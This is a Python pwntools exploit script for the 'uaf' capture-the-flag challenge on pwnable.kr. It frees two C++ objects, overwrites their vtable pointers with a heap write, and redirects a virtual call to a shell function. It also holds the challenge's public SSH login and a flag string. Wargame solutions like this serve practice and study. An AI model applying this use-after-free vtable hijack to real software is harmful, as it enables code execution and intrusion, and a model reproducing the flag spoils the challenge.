#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './uaf')

### defines ###
OBJ_SIZE = 0x30
PAYLOAD_FILE = "/dev/stdin"

### SSH Details ###
user = "uaf"
host = "pwnable.kr"
ssh_port = 2222
password = "guest"
nc_cmd = "./uaf"

def use(io: process):
    """
    Run Human object Introduce function,
    Every child object has its own Introduce func.
    """
    io.sendlineafter("1. use", '1')

def after(io: process, data: str): 
    """
    Create buffer object in size from argv[1],
    Then write data into it from the file mentioned in argv[2]. (/dev/stdin - user input)
    """
    io.sendlineafter("2. after", '2')
    io.sendline(data)

def free(io: process):
    """
    free Man & Woman objects.
    """
    io.sendlineafter("3. free", '3')

def start_ssh(user: str, host: str, ssh_port: int, nc_cmd: str, argv=None,
                 keyfile: str = None, password: str = None):
    log.info(f"ssh -> {user}@{host}:{ssh_port} ; running: {nc_cmd}")
    ssh_client = ssh(user, host, port=ssh_port, keyfile=keyfile, password=password)
    cmd = [nc_cmd] + list(map(str, argv))
    io = ssh_client.run(cmd, tty=True)
    io.ssh_client = ssh_client
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return start_ssh(user, host, ssh_port, nc_cmd, argv, password=password)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

def main():
    io = start([str(OBJ_SIZE), PAYLOAD_FILE])

    # Now we will run the get_shell functions instead of the introduce function.
    payload = p64(exe.sym._ZTV3Man+8)

    # Free both Man & Woman objects.
    free(io)

    # Edit both of the objects vtables addresses.
    after(io, payload)
    after(io, payload)

    # Run get_shell functions instead of Introduce functions.
    use(io)

    io.interactive()

if __name__ == "__main__":
    main()

#flag: d3lici0us_fl4g_after_pwning
